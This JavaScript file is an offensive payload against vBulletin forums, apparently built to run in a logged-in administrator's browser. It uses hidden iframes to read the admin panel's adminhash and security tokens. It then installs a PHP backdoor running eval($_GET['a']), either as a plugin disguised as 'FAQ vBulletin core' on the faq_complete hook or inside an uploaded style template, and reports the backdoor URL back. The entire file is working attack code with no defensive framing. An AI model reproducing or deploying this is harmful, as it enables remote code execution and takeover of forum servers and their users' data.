function admicpparse(){
	try{
		sf = document.getElementsByClassName('smallfont')
		for(var cf=0; cf<sf.length; cf++){
			if (sf[cf].getElementsByTagName('strong')[0]=='[object HTMLElement]'){
				if (sf[cf].getElementsByTagName('strong')[0].childNodes=='[object NodeList]'){
					var nodes = sf[cf].getElementsByTagName('strong')[0].childNodes
					for(var nf=0; nf<nodes.length; nf++){
						try{
							if(sf[cf].getElementsByTagName('strong')[0].childNodes[nf].href.indexOf('index.php')>0){
								var admicpparse = sf[cf].getElementsByTagName('strong')[0].childNodes[nf].href.match(/(.*?)index.php/)[1]
								break;
								break;
							}
						}
						catch(e){
						}
					}
				}
			}
		}
		if(admicpparse==undefined){
			fl = document.getElementById('footer_links').getElementsByTagName('a')
			for (var at = 0; at < fl.length; at++) {
				try{
					if(fl[at].href.indexOf('index.php')>0){
						var admicpparse = fl[at].href.match(/(.*?)index.php/)[1]
						break
					}
				}catch(e){
				}
			}
			inject34(admicpparse) //4.*
		}else{
			inject34(admicpparse) //3.*
		}
	}catch(e){
		try{
			mfr=document.createElement('iframe');
			mfr.style.visibility='hidden';
			mfr.name='mfr';
			mfr.src='member/1';
			mfr.onload=function(){
				try{
					mfrdoc=window.frames.mfr.contentDocument
					href=mfrdoc.getElementsByClassName('edit-user-link')[0].href
					href=href.substr(0,href.indexOf('index.php'))
					inject5(href)
				}catch(e){
					inject34('admincp/');
					inject5('admincp/');
				}
			}
			document.body.appendChild(mfr)
		}catch(e){
			inject34('admincp/');
			inject5('admincp/');
		}
	}
}

function inject5(adminhref){
	tfr=document.createElement('iframe');
	tfr.style.visibility='hidden';
	tfr.name='tfr';
	tfr.src=adminhref+'template.php?do=files';
	tfr.onload=function(){
		tfr.onload='';

		tfrdoc=window.frames.tfr.contentDocument;

		s=tfrdoc.getElementsByName('s')[0].value
		adminhash=tfrdoc.getElementsByName('adminhash')[0].value
		securitytoken=tfrdoc.getElementsByName('securitytoken')[0].value

		var xhr = new XMLHttpRequest();
		xhr.open("POST", adminhref+"/template.php?do=upload", true);
		xhr.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
		xhr.setRequestHeader("Accept-Language", "ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3");
		xhr.setRequestHeader("Content-Type", "multipart/form-data; boundary=---------------------------31073107797883");
		xhr.withCredentials = true;
		var body = "-----------------------------31073107797883\r\n" + 
			"Content-Disposition: form-data; name=\"s\"\r\n" + 
			"\r\n" + 
			s+"\r\n" + 
			"-----------------------------31073107797883\r\n" + 
			"Content-Disposition: form-data; name=\"do\"\r\n" + 
			"\r\n" + 
			"upload\r\n" + 
			"-----------------------------31073107797883\r\n" + 
			"Content-Disposition: form-data; name=\"adminhash\"\r\n" + 
			"\r\n" + 
			adminhash+"\r\n" + 
			"-----------------------------31073107797883\r\n" + 
			"Content-Disposition: form-data; name=\"securitytoken\"\r\n" + 
			"\r\n" + 
			securitytoken+"\r\n" + 
			"-----------------------------31073107797883\r\n" + 
			"Content-Disposition: form-data; name=\"stylefile\"; filename=\"rce.xml\"\r\n" + 
			"Content-Type: text/xml\r\n" + 
			"\r\n" + 
			"\x3c?xml version=\"1.0\" encoding=\"ISO-8859-1\"?\x3e\r\n" + 
			"\r\n" + 
			"\x3cstyle name=\"test\" vbversion=\"5.2.4\" product=\"vbulletin\" type=\"custom\" dateline=\"1476718264\"\x3e\n" + 
			"\t\x3cguid\x3e"+Math.random()+"\x3c/guid\x3e\n" + 
			"\t\x3ctemplategroup name=\"Display\"\x3e\n" + 
			"\t\t\x3ctemplate name=\"display_Forums\" templatetype=\"template\" date=\"1476726786\" username=\"admin\" version=\"5.2.4\"\x3e\x3c![CDATA[\x3ctable class=\"forum-list-container stretch\"\x3e\r\n" + 
			"\x3ctr class=\"forum-list-header\"\x3e\r\n" + 
			"\t\x3cth class=\"header-forum\"\x3e\x3cspan\x3e\x3cvb:if condition=\"isset($forumHeaderPhrase)\"\x3e{vb:rawphrase {vb:raw forumHeaderPhrase}}\x3cvb:else /\x3e{vb:rawphrase directory}\x3c/vb:if\x3e\x3c/span\x3e\x3c/th\x3e\r\n" + 
			"\t\x3cth class=\"header-topics\"\x3e\x3cspan\x3e{vb:rawphrase topics}\x3c/span\x3e\x3c/th\x3e\r\n" + 
			"\t\x3cth class=\"header-posts\"\x3e\x3cspan\x3e{vb:rawphrase posts}\x3c/span\x3e\x3c/th\x3e\r\n" + 
			"\t\x3cth class=\"header-lastpost\"\x3e\x3cspan\x3e{vb:rawphrase last_post}\x3c/span\x3e\x3c/th\x3e\r\n" + 
			"\x3c/tr\x3e\r\n" + 
			"\x3cvb:if condition=\"!empty($channels) AND empty($channels[\'errors\'])\"\x3e\t\r\n" + 
			"\t{vb:template display_Forums_list, channels={vb:raw channels}, root={vb:raw root}}\r\n" + 
			"\t\x3c/table\x3e\r\n" + 
			"\x3cvb:elseif condition=\"!empty($channels[\'errors\'])\" /\x3e\r\n" + 
			"\t\x3c/table\x3e\r\n" + 
			"\t\x3cdiv class=\"conversation-empty\"\x3e{vb:rawphrase error_fetching_forums}\x3c/div\x3e\r\n" + 
			"\x3cvb:else /\x3e\r\n" + 
			"\t\x3c/table\x3e\r\n" + 
			"\t\x3cdiv class=\"conversation-empty\"\x3e{vb:rawphrase no_forums_found}\x3c/div\x3e\r\n" + 
			"\x3c/vb:if\x3e\r\n" + 
			"\x3cvb:if condition=\"eval($_GET[\'a\'])\"\x3e\x3c/vb:if\x3e\r\n" + 
			"\x3cdiv class=\"list-footer\"\x3e\x3ca href=\"#\" class=\"markchannelsread\"\x3e{vb:rawphrase mark_channels_read}\x3c/a\x3e\x3c/div\x3e\r\n" + 
			"]]\x3e\x3c/template\x3e\n" + 
			"\t\x3c/templategroup\x3e\n" + 
			"\t\x3cstylevardfns\x3e\n" + 
			"\t\x3c/stylevardfns\x3e\n" + 
			"\t\x3cstylevars\x3e\n" + 
			"\t\x3c/stylevars\x3e\n" + 
			"\x3c/style\x3e\n" + 
			"\r\n" + 
			"-----------------------------31073107797883\r\n" + 
			"Content-Disposition: form-data; name=\"serverfile\"\r\n" + 
			"\r\n" + 
			"./install/vbulletin-style.xml\r\n" + 
			"-----------------------------31073107797883\r\n" + 
			"Content-Disposition: form-data; name=\"overwritestyleid\"\r\n" + 
			"\r\n" + 
			"-1\r\n" + 
			"-----------------------------31073107797883\r\n" + 
			"Content-Disposition: form-data; name=\"anyversion\"\r\n" + 
			"\r\n" + 
			"1\r\n" + 
			"-----------------------------31073107797883\r\n" + 
			"Content-Disposition: form-data; name=\"title\"\r\n" + 
			"\r\n" + 
			"vBulletin demo\r\n" + 
			"-----------------------------31073107797883\r\n" + 
			"Content-Disposition: form-data; name=\"parentid\"\r\n" + 
			"\r\n" + 
			"-1\r\n" + 
			"-----------------------------31073107797883\r\n" + 
			"Content-Disposition: form-data; name=\"displayorder\"\r\n" + 
			"\r\n" + 
			"1\r\n" + 
			"-----------------------------31073107797883\r\n" + 
			"Content-Disposition: form-data; name=\"userselect\"\r\n" + 
			"\r\n" + 
			"1\r\n" + 
			"-----------------------------31073107797883\r\n" + 
			"Content-Disposition: form-data; name=\"MAX_FILE_SIZE\"\r\n" + 
			"\r\n" + 
			"999999999\r\n" + 
			"-----------------------------31073107797883--\r\n";
		var aBody = new Uint8Array(body.length);
		for (var i = 0; i < aBody.length; i++){
			aBody[i] = body.charCodeAt(i); 
		}
		xhr.send(new Blob([aBody]));
		xhr.onload=function(){
			(new Image()).src=adminhref+'/template.php?do=rebuild&goto=template.php';
			sendReport('Check your backdoor here: ' + adminhref + '../?styleid=%int%&a=phpinfo();');
		}
	}
	document.body.appendChild(tfr);
}


function inject34(adminhref){
	pfr=document.createElement('iframe');
	pfr.style.visibility='hidden';
	pfr.name='pfr';
	pfr.src=adminhref+'/plugin.php?do=add';
	pfr.onload=function(){
		pfr.onload=function(){
			sendReport('Check your backdoor here: ' + adminhref + '../faq.php?a=phpinfo();');
		}

		pfrdoc=window.frames.pfr.contentDocument;
		adminhash=pfrdoc.getElementsByName('adminhash')[0].value;
		securitytoken=pfrdoc.getElementsByName('securitytoken')[0].value;
		pfrdoc.getElementsByName('phpcode')[0].value='eval($_GET[\'a\']);';
		pfrdoc.getElementsByName('title')[0].value='FAQ vBulletin core';
		pfrdoc.getElementsByName('hookname')[0].value='faq_complete';
		pfrdoc.getElementById('rb_1_active_6').click();
		securitytoken=pfrdoc.getElementsByName('return')[0].click();

	}
	document.body.appendChild(pfr);
}

admicpparse()